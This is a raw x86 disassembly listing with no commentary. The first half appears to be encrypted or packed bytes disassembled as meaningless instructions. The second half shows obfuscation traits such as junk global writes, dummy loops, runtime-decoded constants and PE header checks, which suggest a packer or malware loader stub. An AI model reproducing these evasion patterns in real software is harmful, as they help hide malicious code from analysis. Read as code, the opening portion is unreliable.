  404a29:	rcl    DWORD PTR [ebx],1
  404a2b:	imul   esi,DWORD PTR [ebx+0x47],0xfffffff7
  404a2f:	pop    edx
  404a30:	fidiv  WORD PTR ds:0xc7af525e
  404a36:	dec    edi
  404a37:	dec    edi
  404a38:	stc    
  404a39:	das    
  404a3a:	fstp   QWORD PTR [ecx]
  404a3c:	mov    ?,WORD PTR [ebx]
  404a3e:	jp     0x404a30
  404a40:	stc    
  404a41:	adc    DWORD PTR [edi],0xffffffeb
  404a44:	dec    edi
  404a45:	pop    edi
  404a46:	ds popf 
  404a48:	xchg   ebp,eax
  404a49:	(bad)  
  404a4b:	pop    ds
  404a4c:	in     eax,dx
  404a4d:	jge    0x404aa8
  404a4f:	in     al,0x1d
  404a51:	imul   esp,DWORD PTR [eax-0x19],0xffffffc7
  404a55:	adc    al,0xd1
  404a57:	sub    esi,esp
  404a59:	mov    ecx,0xd6db8ccc
  404a5e:	pop    eax
  404a5f:	stc    
  404a60:	jb     0x404ab6
  404a62:	mov    edi,0x51e30639
  404a67:	or     eax,DWORD PTR [edx+0x1b76be17]
  404a6d:	dec    edx
  404a6e:	and    DWORD PTR [eax+0x13],ebp
  404a71:	not    BYTE PTR [ebx+0x53]
  404a74:	add    DWORD PTR [ebp+0x34],ecx
  404a77:	fsub   QWORD PTR [ecx+0x165ada09]
  404a7d:	dec    esp
  404a7e:	mov    eax,0xf65c248e
  404a83:	sub    al,0xb4
  404a85:	add    BYTE PTR [eax+0x58],dh
  404a88:	mov    cl,0xe7
  404a8a:	push   edi
  404a8b:	clc    
  404a8c:	daa    
  404a8d:	dec    edi
  404a8e:	mov    ebx,0x5276f3b5
  404a93:	or     ah,BYTE PTR [edi+0x56ca04ba]
  404a99:	mov    ds:0x4139c5d4,al
  404a9e:	lock test cl,ch
  404aa1:	fisttp DWORD PTR [esi+0x3f605e2f]
  404aa7:	repnz mov ebx,0x14f55436
  404aad:	(bad)  
  404aae:	outs   dx,BYTE PTR ds:[esi]
  404aaf:	retf   
  404ab0:	ret    0x3fa0
  404ab3:	dec    edx
  404ab4:	je     0x404b06
  404ab6:	into   
  404ab7:	call   0xdbda:0x5c5a99f
  404abe:	mov    edi,0x44d9c614
  404ac3:	and    BYTE PTR [eax-0x12f2930c],0xa3
  404aca:	lods   al,BYTE PTR ds:[esi]
  404acb:	imul   ebx,DWORD PTR [eax-0x2f],0xe762694e
  404ad2:	push   ss
  404ad3:	push   es
  404ad4:	lock stos BYTE PTR es:[edi],al
  404ad6:	mov    ecx,0x1fd3a7d3
  404adb:	fsubr  QWORD PTR [ebx]
  404add:	shl    BYTE PTR ds:0x4397cbe4,0x5
  404ae4:	mov    ?,WORD PTR ds:0xbf074ccf
  404aea:	cmp    BYTE PTR [edx],bh
  404aec:	jge    0x404a89
  404aee:	aaa    
  404aef:	push   ss
  404af0:	retf   
  404af1:	dec    ebp
  404af2:	xor    BYTE PTR [esi],dl
  404af4:	popa   
  404af5:	ss into 
  404af7:	aam    0x67
  404af9:	rcr    DWORD PTR [ecx],1
  404afb:	in     eax,0xf6
  404afd:	mov    al,ds:0xd463527e
  404b02:	push   0x3d
  404b04:	sbb    bl,BYTE PTR [esi+0x1a]
  404b07:	aas    
  404b08:	inc    ebp
  404b09:	dec    ecx
  404b0a:	push   0xffffff9c
  404b0c:	cdq    
  404b0d:	xor    al,0x80
  404b0f:	rol    BYTE PTR [eax-0x7],0x42
  404b13:	or     DWORD PTR [ebx+0x1],edi
  404b16:	(bad)  
  404b17:	retf   0x6d4b
  404b1a:	xchg   DWORD PTR [edi],ecx
  404b1c:	fisub  WORD PTR [eax]
  404b1e:	pop    esp
  404b1f:	ins    BYTE PTR es:[edi],dx
  404b20:	loope  0x404b0d
  404b22:	jle    0x404b1f
  404b24:	dec    edi
  404b25:	outs   dx,DWORD PTR ds:[esi]
  404b26:	cli    
  404b27:	nop
  404b28:	mov    ds:0x69ae8f4c,al
  404b2d:	setl   BYTE PTR [eax-0x6]
  404b31:	sbb    eax,0xdc84cd87
  404b36:	add    DWORD PTR [ebp+0x4cf8d2b7],edi
  404b3c:	fwait
  404b3d:	data16 fs addr16 jle 0x404af2
  404b42:	push   edi
  404b43:	sbb    esi,DWORD PTR [ecx]
  404b45:	mov    ecx,0x98d5a8be
  404b4a:	jno    0x404b4f
  404b4c:	inc    ebx
  404b4d:	pop    esp
  404b4e:	cld    
  404b4f:	aad    0xa4
  404b51:	cmp    DWORD PTR [edx-0x7f],eax
  404b54:	shl    BYTE PTR [ecx-0x1de159ff],0xe4
  404b5b:	stos   BYTE PTR es:[edi],al
  404b5c:	cmp    al,0xfe
  404b5e:	push   edx
  404b5f:	and    ch,BYTE PTR [edi]
  404b61:	out    dx,al
  404b62:	bound  esp,QWORD PTR [ecx+0x8316b25]
  404b68:	or     eax,0xf5003caa
  404b6d:	cdq    
  404b6e:	add    esi,ecx
  404b70:	int3   
  404b71:	mov    ecx,DWORD PTR [ebx-0x4d]
  404b74:	inc    esp
  404b75:	push   eax
  404b76:	lock scas eax,DWORD PTR es:[edi]
  404b78:	into   
  404b79:	out    dx,eax
  404b7a:	out    0x34,eax
  404b7c:	ja     0x404bf7
  404b7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b7f:	and    ah,al
  404b81:	push   ebp
  404b82:	xchg   BYTE PTR [edx],al
  404b84:	pop    ebp
  404b85:	jmp    0x7f5e:0x501850d8
  404b8c:	fldl2e 
  404b8e:	mov    ebx,DWORD PTR [ecx+edx*1-0x2539150b]
  404b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b96:	inc    edi
  404b97:	pop    es
  404b98:	push   ecx
  404b99:	and    ch,BYTE PTR [eax-0x42364ca]
  404b9f:	adc    DWORD PTR [ecx-0x5f],0xd9eb49fe
  404ba6:	mov    WORD PTR [ebx-0x7d],ds
  404ba9:	(bad)  
  404baa:	mov    eax,0xa7fac66e
  404baf:	mov    ss,WORD PTR [ebp+ebp*2-0x521f5744]
  404bb6:	jo     0x404b7f
  404bb8:	add    al,0xa5
  404bba:	mov    ebp,0xa39f63b4
  404bbf:	scas   al,BYTE PTR es:[edi]
  404bc0:	mov    eax,0xa22c1a20
  404bc5:	jnp    0x404c41
  404bc7:	mov    gs,edi
  404bc9:	adc    esp,edi
  404bcb:	icebp  
  404bcc:	lahf   
  404bcd:	pop    eax
  404bce:	mov    eax,ds:0x2475be8d
  404bd3:	mov    esp,0x6f2a7943
  404bd8:	dec    ebx
  404bd9:	xor    ah,BYTE PTR ds:0x4c1d4e3c
  404bdf:	dec    ebp
  404be0:	xchg   esi,eax
  404be1:	mov    bl,0x6d
  404be3:	ja     0x404b7f
  404be5:	cld    
  404be6:	mov    ds:0xac44ebd7,al
  404beb:	mov    BYTE PTR [eax],dl
  404bed:	sbb    al,0xec
  404bef:	in     al,dx
  404bf0:	(bad)  
  404bf1:	ins    DWORD PTR es:[edi],dx
  404bf2:	aad    0xf3
  404bf4:	data16 neg BYTE PTR [esi+0xcf55582]
  404bfb:	push   ecx
  404bfc:	sbb    al,0x7b
  404bfe:	mov    edi,0xe14f043d
  404c03:	xor    bh,BYTE PTR [ebx-0x72f61b42]
  404c09:	sbb    ebp,edi
  404c0b:	and    eax,0x1e25780a
  404c10:	sbb    BYTE PTR [ebx-0x3b],ch
  404c13:	dec    ebp
  404c14:	pop    ds
  404c15:	lods   eax,DWORD PTR ds:[esi]
  404c16:	daa    
  404c17:	std    
  404c18:	out    dx,al
  404c19:	push   0x8b8369e9
  404c1e:	cdq    
  404c1f:	(bad)  
  404c21:	retf   
  404c22:	imul   BYTE PTR [esi]
  404c24:	mov    cl,0x9
  404c26:	xor    al,0xc9
  404c28:	arpl   WORD PTR [edx+0x7685fdbb],ax
  404c2e:	jl     0x404c51
  404c30:	bound  esi,QWORD PTR [edx-0x71]
  404c33:	imul   DWORD PTR [ebx+0x31]
  404c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c37:	or     al,0x85
  404c39:	nop
  404c3a:	and    DWORD PTR [ecx+0x1a],0xffffff86
  404c3e:	push   esp
  404c3f:	clc    
  404c40:	pop    esi
  404c41:	sbb    eax,0x3165547d
  404c46:	add    al,0x43
  404c48:	lea    edi,[ecx-0x32429eec]
  404c4e:	dec    ebx
  404c4f:	sbb    edx,DWORD PTR [eax]
  404c51:	leave  
  404c52:	fcom   QWORD PTR [edi]
  404c54:	push   es
  404c55:	jne    0x404ca1
  404c57:	pop    ebp
  404c58:	and    ah,BYTE PTR [edx]
  404c5a:	out    0x4e,eax
  404c5c:	inc    ebx
  404c5d:	in     eax,dx
  404c5e:	xchg   esi,eax
  404c5f:	loopne 0x404c8f
  404c61:	pop    esi
  404c62:	lds    eax,FWORD PTR ds:0xd05904cd
  404c68:	xor    BYTE PTR [esi+eiz*4+0x348b870],al
  404c6f:	cmp    DWORD PTR [edx-0x6c27f91b],edx
  404c75:	shr    DWORD PTR [edi+ebx*2],1
  404c78:	inc    esi
  404c79:	(bad)  
  404c7a:	pop    ds
  404c7b:	mov    esi,0xb26eeb53
  404c80:	jl     0x404c7d
  404c82:	fwait
  404c83:	imul   ecx,DWORD PTR [eax-0x1a],0x598c2761
  404c8a:	push   edx
  404c8b:	cwde   
  404c8c:	lods   eax,DWORD PTR ds:[esi]
  404c8d:	pop    edi
  404c8e:	or     DWORD PTR [eax-0x53],eax
  404c91:	outs   dx,BYTE PTR ds:[esi]
  404c92:	xchg   ebp,eax
  404c93:	xchg   ebp,eax
  404c94:	loope  0x404cdf
  404c96:	or     eax,0xe6ed79df
  404c9b:	test   DWORD PTR ds:0x40b5cd35,ebx
  404ca1:	loop   0x404c27
  404ca3:	in     al,dx
  404ca4:	inc    esp
  404ca5:	xor    eax,0x61bd7971
  404caa:	xchg   edi,eax
  404cab:	leave  
  404cac:	ret    
  404cad:	test   BYTE PTR [edi+0x6d40144e],dl
  404cb3:	imul   BYTE PTR [esi+0x30]
  404cb6:	loop   0x404c3b
  404cb8:	scas   al,BYTE PTR es:[edi]
  404cb9:	jp     0x404c53
  404cbb:	shl    BYTE PTR [esi-0x5c],cl
  404cbe:	fnstenv [esi+0x572f4d8a]
  404cc4:	out    0x1b,al
  404cc6:	sbb    ah,ch
  404cc8:	xor    edi,DWORD PTR [esi+0x7dfcc2a2]
  404cce:	sbb    eax,0x45cbd380
  404cd3:	pop    es
  404cd4:	cs jg  0x404ccc
  404cd7:	mov    dh,0x7
  404cd9:	adc    ebp,DWORD PTR [ebp-0x32]
  404cdc:	xor    dl,BYTE PTR [edx+0x5a]
  404cdf:	mov    ecx,0xbf308cc0
  404ce4:	mov    eax,ds:0xdd7ade5c
  404ce9:	sbb    al,0x57
  404ceb:	lock and BYTE PTR [ecx],0x6a
  404cef:	sbb    BYTE PTR [edi+eiz*8],cl
  404cf2:	aad    0x7e
  404cf4:	retf   0x80ab
  404cf7:	push   cs
  404cf8:	push   ebp
  404cf9:	dec    edi
  404cfa:	xchg   ebp,eax
  404cfb:	mov    cl,0xd0
  404cfd:	pop    eax
  404cfe:	jns    0x404cda
  404d00:	add    DWORD PTR [ebx-0x23],0x1a
  404d04:	lea    ebx,[esi]
  404d06:	imul   edi,DWORD PTR [ecx-0x16],0xffffffe0
  404d0a:	(bad)  
  404d0b:	stc    
  404d0c:	mov    ds:0xd2f3530f,al
  404d11:	enter  0xcc7d,0xda
  404d15:	repz inc ebp
  404d17:	sbb    DWORD PTR [ecx],0xfffffff9
  404d1a:	in     eax,dx
  404d1b:	sub    DWORD PTR [ebx],ebx
  404d1d:	pop    ebp
  404d1e:	pop    ecx
  404d1f:	mov    esi,0xc5ce8cc9
  404d24:	pushf  
  404d25:	pop    es
  404d26:	push   DWORD PTR [ecx-0x77]
  404d29:	cwde   
  404d2a:	fisttp DWORD PTR [edi]
  404d2c:	lds    ecx,FWORD PTR ds:0x4a1b2cc9
  404d32:	shr    edx,0xd9
  404d35:	mov    esp,0x3cacc609
  404d3a:	adc    al,0x43
  404d3c:	mov    dl,cl
  404d3e:	sbb    DWORD PTR ds:0x31d21325,eax
  404d44:	repnz jecxz 0x404d6f
  404d47:	or     ah,BYTE PTR [esi+edi*2+0x63]
  404d4b:	jp     0x404cd5
  404d4d:	xchg   esi,eax
  404d4e:	push   es
  404d4f:	int3   
  404d50:	pop    edx
  404d51:	aam    0x9
  404d53:	loopne 0x404d39
  404d55:	lock scas al,BYTE PTR es:[edi]
  404d57:	pop    ebx
  404d58:	aaa    
  404d59:	ins    DWORD PTR es:[edi],dx
  404d5a:	je     0x404d51
  404d5c:	imul   esp,ebx,0xffffffb3
  404d5f:	add    DWORD PTR [ecx-0x80f648a],edi
  404d65:	popf   
  404d66:	mov    WORD PTR [eax+0x37],es
  404d69:	sub    al,0x72
  404d6b:	lahf   
  404d6c:	mov    edi,DWORD PTR [edi]
  404d6e:	or     BYTE PTR [ebx+0x465c3727],0xa1
  404d75:	add    eax,0xcd28c229
  404d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7b:	ret    
  404d7c:	or     BYTE PTR [eax],0xef
  404d7f:	mov    eax,ds:0x8032cf99
  404d84:	(bad)  
  404d85:	pushf  
  404d86:	jne    0x404d5c
  404d88:	outs   dx,DWORD PTR ds:[si]
  404d8a:	and    ch,BYTE PTR [ecx-0x375940b0]
  404d90:	fist   WORD PTR [edx+0x718461da]
  404d96:	(bad)  
  404d97:	jg     0x404ddb
  404d99:	dec    ecx
  404d9a:	cmp    cl,BYTE PTR [eax-0x3f09281c]
  404da0:	mov    edx,0x9a0ea3a0
  404da5:	jp     0x404e24
  404da7:	inc    ecx
  404da8:	cmp    eax,0x6628910a
  404dad:	je     0x404dbb
  404daf:	xor    BYTE PTR [eax-0x6aa42768],0x80
  404db6:	xor    eax,0xdbcf792d
  404dbb:	pop    ds
  404dbc:	(bad)  
  404dbd:	mov    ah,0xb6
  404dbf:	add    al,0x7f
  404dc1:	test   eax,0xb530cb78
  404dc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dc7:	lods   eax,DWORD PTR ds:[esi]
  404dc8:	add    eax,DWORD PTR [edi]
  404dca:	popa   
  404dcb:	test   DWORD PTR [esi+0x774523cd],edi
  404dd1:	fisttp DWORD PTR [ebx+0x32]
  404dd4:	mov    bl,0xca
  404dd6:	pop    ebp
  404dd7:	mov    eax,0x769c7af7
  404ddc:	test   eax,0xf5dd8f07
  404de1:	or     BYTE PTR ds:0x54623017,ah
  404de7:	(bad)
  404dea:	inc    esi
  404deb:	out    dx,eax
  404dec:	jnp    0x404dbd
  404dee:	inc    esp
  404def:	pop    edi
  404df0:	sub    bh,al
  404df2:	mov    WORD PTR [ebp-0x575b9809],?
  404df8:	loope  0x404dd9
  404dfa:	push   edx
  404dfb:	ficomp WORD PTR [ebp+0x2e22aa6e]
  404e01:	xchg   ebp,eax
  404e02:	fwait
  404e03:	mov    edi,0x59d14cfc
  404e08:	xchg   BYTE PTR [eax],bh
  404e0a:	cmp    BYTE PTR [edx-0x3d],0xc6
  404e0e:	xchg   ebp,eax
  404e0f:	mov    fs,edx
  404e11:	loopne 0x404e70
  404e13:	adc    al,BYTE PTR [ebp-0x61]
  404e16:	outs   dx,BYTE PTR ds:[esi]
  404e17:	cmp    dl,BYTE PTR [esp+edx*1+0x4]
  404e1b:	fldenv cs:[bp+si+0x35ca]
  404e21:	pop    esi
  404e22:	xchg   edx,eax
  404e23:	push   ebp
  404e24:	cmc    
  404e25:	and    eax,0x5378c6f1
  404e2a:	mov    dh,BYTE PTR [edi-0x6a]
  404e2d:	repz jno 0x404e77
  404e30:	mov    eax,0xba578b1e
  404e35:	into   
  404e36:	xchg   ecx,eax
  404e37:	(bad)  
  404e38:	div    bh
  404e3a:	int3   
  404e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e3c:	push   esi
  404e3d:	sbb    eax,0x65990f5c
  404e42:	into   
  404e43:	nop
  404e44:	cwde   
  404e45:	(bad)  
  404e46:	jb     0x404e31
  404e48:	(bad)  
  404e49:	push   eax
  404e4a:	(bad)  
  404e4b:	or     BYTE PTR [esi],0x7b
  404e4e:	fcomip st,st(1)
  404e51:	pop    esi
  404e52:	mov    ss,ebp
  404e54:	mov    esp,0xd35e9ae2
  404e59:	sti    
  404e5a:	cwde   
  404e5b:	(bad)  
  404e5c:	mov    eax,ds:0x1b44fd8a
  404e61:	ror    DWORD PTR [eax-0x269f6ff3],0x33
  404e68:	inc    ebx
  404e69:	xor    eax,0xa5848402
  404e6e:	nop
  404e6f:	and    DWORD PTR [ebx],ebx
  404e71:	ficom  WORD PTR [edx-0x73]
  404e74:	xor    edx,0xffffffbf
  404e77:	or     eax,DWORD PTR ds:0xdef057b1
  404e7d:	xlat   BYTE PTR ds:[ebx]
  404e7e:	pop    edi
  404e7f:	gs stos DWORD PTR es:[edi],eax
  404e81:	jmp    0x404e65
  404e83:	pop    esp
  404e84:	sbb    esp,ecx
  404e86:	push   ecx
  404e87:	mov    dl,0x20
  404e89:	pop    edx
  404e8a:	ret    0x4a8c
  404e8d:	imul   BYTE PTR [esi-0x6dbcbf7b]
  404e93:	iret   
  404e94:	iret   
  404e95:	aam    0xb0
  404e97:	fnstcw WORD PTR [ecx-0x36605d2c]
  404e9d:	push   cs
  404e9e:	add    BYTE PTR [esi-0x5a2e7965],cl
  404ea4:	fadd   DWORD PTR [esp+ebp*1]
  404ea7:	and    DWORD PTR [ebx-0x349d21fc],ebx
  404ead:	retf   0x46ea
  404eb0:	mov    eax,ebp
  404eb2:	mov    ebx,0x81dfb57a
  404eb7:	pop    esp
  404eb8:	jno    0x404e65
  404eba:	push   edi
  404ebb:	sbb    esi,esp
  404ebd:	js     0x404eeb
  404ebf:	jge    0x404eea
  404ec1:	call   0x7782:0xc47a767a
  404ec8:	pop    ds
  404ec9:	mov    al,0x91
  404ecb:	fimul  DWORD PTR [eax-0x6d]
  404ece:	mov    ch,0x43
  404ed0:	jnp    0x404e54
  404ed2:	vpxor  xmm3,xmm2,xmm5
  404ed6:	test   DWORD PTR ds:0xdb77eb39,ebx
  404edc:	add    ebx,edi
  404ede:	fadd   QWORD PTR [edi+0x3d]
  404ee1:	mov    ecx,0x46952f7e
  404ee6:	mov    al,0x78
  404ee8:	mov    bh,0x38
  404eea:	mov    ebp,0xce49ba64
  404eef:	stc    
  404ef0:	pusha  
  404ef1:	xchg   esp,eax
  404ef2:	add    esi,DWORD PTR [esi-0x18febe1a]
  404ef8:	pop    edx
  404ef9:	adc    BYTE PTR [ecx],al
  404efb:	and    dl,BYTE PTR [ebx+0x61]
  404efe:	mov    ds:0xb1d74383,al
  404f03:	xchg   esi,eax
  404f04:	test   BYTE PTR ds:0x394c8f21,bl
  404f0a:	sti    
  404f0b:	cs jg  0x53daf69b
  404f12:	xchg   edi,eax
  404f13:	lahf   
  404f14:	mov    ch,0xf2
  404f16:	or     ebx,eax
  404f18:	shl    dh,cl
  404f1a:	test   al,0x59
  404f1c:	fucomip st,st(5)
  404f1e:	je     0x404f83
  404f20:	mov    al,ds:0x48319290
  404f25:	imul   edx,DWORD PTR [ebx+0x27],0x7c
  404f29:	mov    ds:0x9cf9c6c1,eax
  404f2e:	fwait
  404f2f:	mov    eax,DWORD PTR [ebp-0x4]
  404f32:	mov    edi,DWORD PTR [ebp-0x8]
  404f35:	xor    edi,edx
  404f37:	add    edi,esi
  404f39:	mov    esi,DWORD PTR [ebp+0x8]
  404f3c:	imul   edi,ecx
  404f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  404f42:	xor    eax,edx
  404f44:	add    eax,ecx
  404f46:	mov    al,BYTE PTR [ebx+eax*1+0x3272dd]
  404f4d:	mov    BYTE PTR [edi+esi*1],al
  404f50:	mov    eax,DWORD PTR [ebp-0x8]
  404f53:	mov    esi,DWORD PTR [ebp+0x10]
  404f56:	xor    eax,edx
  404f58:	xor    ebx,ebx
  404f5a:	add    esi,0xfabdbeed
  404f60:	adc    ebx,0xffffffff
  404f63:	lea    ecx,[ecx+eax*1+0x3272dd]
  404f6a:	xor    edi,edi
  404f6c:	xor    esi,0x8a29a127
  404f72:	xor    ebx,0x0
  404f75:	mov    eax,ecx
  404f77:	add    eax,0xfabdbeed
  404f7c:	adc    edi,0xffffffff
  404f7f:	xor    eax,0x8a29a127
  404f84:	xor    edi,0x0
  404f87:	cmp    eax,esi
  404f89:	jne    0x402b72
  404f8f:	cmp    edi,ebx
  404f91:	jne    0x402b72
  404f97:	mov    eax,0xf89c85b2
  404f9c:	pop    ebx
  404f9d:	pop    edi
  404f9e:	pop    esi
  404f9f:	leave  
  404fa0:	ret    0xc
  404fa3:	push   ebp
  404fa4:	mov    ebp,esp
  404fa6:	push   ecx
  404fa7:	add    eax,DWORD PTR ds:0x42a000
  404fad:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  404fb4:	sbb    DWORD PTR ds:0x42b008,0x61d9
  404fbe:	mov    eax,DWORD PTR [ebp+0x8]
  404fc1:	xor    DWORD PTR ds:0x42c018,0x2d2e
  404fcb:	mov    al,BYTE PTR [eax]
  404fcd:	add    al,0xb
  404fcf:	xor    al,0x71
  404fd1:	cmp    al,0x29
  404fd3:	mov    DWORD PTR ds:0x429010,0x6c7b
  404fdd:	jne    0x40507a
  404fe3:	mov    eax,DWORD PTR [ebp+0x8]
  404fe6:	or     edx,DWORD PTR ds:0x42900c
  404fec:	mov    ecx,DWORD PTR [ebp+0x8]
  404fef:	and    DWORD PTR ds:0x42b00c,0x0
  404ff9:	mov    edx,DWORD PTR ds:0x42b00c
  404fff:	inc    edx
  405000:	mov    DWORD PTR ds:0x42b00c,edx
  405006:	cmp    DWORD PTR ds:0x42b00c,0x1a
  40500d:	jne    0x40501e
  405013:	push   0x42900c
  405018:	call   DWORD PTR ds:0x42ed75
  40501e:	cmp    DWORD PTR ds:0x42b00c,0x15
  405025:	jb     0x404ff9
  40502b:	or     DWORD PTR ds:0x42d008,0x1488
  405035:	add    ecx,DWORD PTR [eax+0x3c]
  405038:	mov    edx,0x7510896
  40503d:	mov    DWORD PTR [ebp+0x8],ecx
  405040:	mov    eax,DWORD PTR [ebp-0x4]
  405043:	xor    eax,edx
  405045:	push   esi
  405046:	mov    esi,DWORD PTR ds:0x42d000
  40504c:	and    DWORD PTR ds:0x42a00c,esi
  405052:	mov    esi,DWORD PTR [ebp+0x8]
  405055:	mov    ecx,0x3272dd
  40505a:	add    eax,ecx
  40505c:	cmp    DWORD PTR [esi+0x54],eax
  40505f:	pop    esi
  405060:	je     0x40506e
  405066:	mov    eax,DWORD PTR [ebp+0x8]
  405069:	jmp    0x405087
  40506e:	mov    eax,DWORD PTR [ebp-0x4]
  405071:	xor    eax,edx
  405073:	add    eax,ecx
  405075:	jmp    0x405087
  40507a:	mov    eax,DWORD PTR [ebp-0x4]
  40507d:	xor    eax,0x7510896
  405082:	add    eax,0x3272dd
  405087:	leave  
  405088:	ret    0x4
  40508b:	push   ebp
  40508c:	mov    ebp,esp
  40508e:	sub    esp,0x78
  405091:	push   ebx
  405092:	push   esi
  405093:	push   edi
  405094:	push   0x1f
  405096:	lea    eax,[ebp-0x78]
  405099:	xor    DWORD PTR ds:0x429018,0x42a014
  4050a3:	push   eax
  4050a4:	push   0x0
  4050a6:	mov    DWORD PTR ds:0x429010,0x21c3
  4050b0:	call   DWORD PTR ds:0x42ed69
  4050b6:	add    DWORD PTR ds:0x429024,0x42c000
  4050c0:	push   0x97898797
  4050c5:	call   DWORD PTR ds:0x42ed2d
  4050cb:	adc    DWORD PTR ds:0x42b018,0x6ca1
  4050d5:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4050dc:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4050e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4050e6:	mov    ebx,0x7510896
  4050eb:	add    DWORD PTR ds:0x42a014,0x255d
  4050f5:	xor    ecx,ebx
  4050f7:	or     DWORD PTR ds:0x429000,0x7ff8
  405101:	mov    eax,0x3272dd
  405106:	add    ecx,eax
  405108:	mov    DWORD PTR [ebp-0x1c],ecx
  40510b:	not    DWORD PTR ds:0x42c018
  405111:	mov    ecx,DWORD PTR [ebp+0x14]
  405114:	test   ecx,ecx
  405116:	mov    DWORD PTR ds:0x42a00c,0x3f58
  405120:	je     0x40513a
  405126:	inc    ecx
  405127:	mov    ecx,DWORD PTR [ebp+0x14]
  40512a:	and    DWORD PTR ds:0x429014,0x1a66
  405134:	mov    ecx,DWORD PTR [ecx]
  405136:	dec    edi
  405137:	mov    DWORD PTR [ebp-0x1c],ecx
  40513a:	add    DWORD PTR ds:0x42901c,edx
  405140:	mov    ecx,0x7665
  405145:	and    DWORD PTR ds:0x42c008,0x0
  40514f:	jmp    0x405161
  405154:	mov    edi,DWORD PTR ds:0x42c008
  40515a:	inc    edi
  40515b:	mov    DWORD PTR ds:0x42c008,edi
  405161:	cmp    DWORD PTR ds:0x42c008,0x10
  405168:	jae    0x405192
  40516e:	cmp    DWORD PTR ds:0x42c008,0x1f
  405175:	jne    0x40518b
  40517b:	push   0x399e
  405180:	push   0x848f
  405185:	call   DWORD PTR ds:0x42ed35
  40518b:	jmp    0x405154
  405190:	xor    edi,edi
  405192:	imul   edx,eax
  405195:	movzx  esi,BYTE PTR ds:0x42c010
  40519c:	xor    DWORD PTR ds:0x42c004,esi
  4051a2:	mov    esi,0x76532
  4051a7:	add    edx,ecx
  4051a9:	and    DWORD PTR ds:0x42a018,0x0
  4051b3:	mov    edi,DWORD PTR ds:0x42a018
  4051b9:	inc    edi
  4051ba:	mov    DWORD PTR ds:0x42a018,edi
  4051c0:	cmp    DWORD PTR ds:0x42a018,0x6
  4051c7:	jne    0x4051e0
  4051cd:	push   0x8802
  4051d2:	push   0x429004
  4051d7:	push   DWORD PTR [ebp-0x24]
  4051da:	call   DWORD PTR ds:0x42ed39
  4051e0:	cmp    DWORD PTR ds:0x42a018,0x5
  4051e7:	jne    0x4051fa
  4051ed:	mov    edi,DWORD PTR ds:0x42a018
  4051f3:	inc    edi
  4051f4:	mov    DWORD PTR ds:0x42a018,edi
  4051fa:	cmp    DWORD PTR ds:0x42a018,0x10
  405201:	jb     0x4051b3
  405207:	and    DWORD PTR ds:0x42d00c,0x0
  405211:	jmp    0x405223
  405216:	mov    edi,DWORD PTR ds:0x42d00c
  40521c:	inc    edi
  40521d:	mov    DWORD PTR ds:0x42d00c,edi
  405223:	cmp    DWORD PTR ds:0x42d00c,0x15
  40522a:	jae    0x405278
  405230:	cmp    DWORD PTR ds:0x42d00c,0xa
  405237:	jne    0x40524d
  40523d:	push   0x42e05b
  405242:	push   0x42e010
  405247:	call   DWORD PTR ds:0x42ed3d
  40524d:	cmp    DWORD PTR ds:0x42d00c,0x9
  405254:	jne    0x405269
  40525a:	xor    edi,edi
  40525c:	or     edi,DWORD PTR ds:0x42d00c
  405262:	inc    edi
  405263:	mov    DWORD PTR ds:0x42d00c,edi
  405269:	jmp    0x405216
  40526e:	adc    DWORD PTR ds:0x42b000,0x4b16
  405278:	xchg   esi,ecx
  40527a:	xor    ecx,DWORD PTR ds:0x42a00c
  405280:	mov    edi,0x54354
  405285:	sub    edx,edi
  405287:	sbb    ecx,0x55bb
  40528d:	mov    ecx,DWORD PTR [ebp-0x4]
  405290:	sub    DWORD PTR ds:0x42a01c,edx
  405296:	xor    ecx,ebx
  405298:	mov    esi,DWORD PTR ds:0x42a018
  40529e:	and    esi,DWORD PTR ds:0x429000
  4052a4:	mov    DWORD PTR ds:0x42a018,esi
  4052aa:	add    ecx,eax
  4052ac:	mov    DWORD PTR [ebp-0x8],ecx
  4052af:	and    DWORD PTR ds:0x42b010,0x0
  4052b9:	jmp    0x4052cb
  4052be:	mov    esi,DWORD PTR ds:0x42b010
  4052c4:	inc    esi
  4052c5:	mov    DWORD PTR ds:0x42b010,esi
  4052cb:	cmp    DWORD PTR ds:0x42b010,0x1e
  4052d2:	jae    0x405313
  4052d8:	cmp    DWORD PTR ds:0x42b010,0x4
  4052df:	jne    0x4052f4
  4052e5:	push   DWORD PTR [ebp-0x1c]
  4052e8:	push   DWORD PTR [ebp-0x20]
  4052eb:	push   DWORD PTR [ebp-0xc]
  4052ee:	call   DWORD PTR ds:0x42ed41
  4052f4:	cmp    DWORD PTR ds:0x42b010,0x3
  4052fb:	jne    0x40530e
  405301:	mov    esi,DWORD PTR ds:0x42b010
  405307:	inc    esi
  405308:	mov    DWORD PTR ds:0x42b010,esi
  40530e:	jmp    0x4052be
  405313:	mov    ecx,DWORD PTR [ebp-0x14]
  405316:	xor    ecx,ebx
  405318:	add    ecx,eax
  40531a:	and    DWORD PTR ds:0x42a00c,0x4b6f
  405324:	mov    DWORD PTR [ebp-0x24],ecx
  405327:	mov    DWORD PTR ds:0x429024,0x1f
  405331:	cmp    DWORD PTR ds:0x429024,0x0
  405338:	je     0x405390
  40533e:	cmp    DWORD PTR ds:0x429024,0x6
  405345:	jne    0x40535e
  40534b:	push   0x5506
  405350:	push   0x42b000
  405355:	push   DWORD PTR [ebp-0x28]
  405358:	call   DWORD PTR ds:0x42ed45
  40535e:	cmp    DWORD PTR ds:0x429024,0x7
  405365:	jne    0x405378
  40536b:	mov    ecx,DWORD PTR ds:0x429024
  405371:	dec    ecx
  405372:	mov    DWORD PTR ds:0x429024,ecx
  405378:	mov    ecx,DWORD PTR ds:0x429024
  40537e:	dec    ecx
  40537f:	mov    DWORD PTR ds:0x429024,ecx
  405385:	jmp    0x405331
  40538a:	or     DWORD PTR ds:0x42a004,ebx
  405390:	mov    ecx,DWORD PTR [ebp-0x4]
  405393:	xor    ecx,ebx
  405395:	add    ecx,eax
  405397:	sub    esi,0x6631
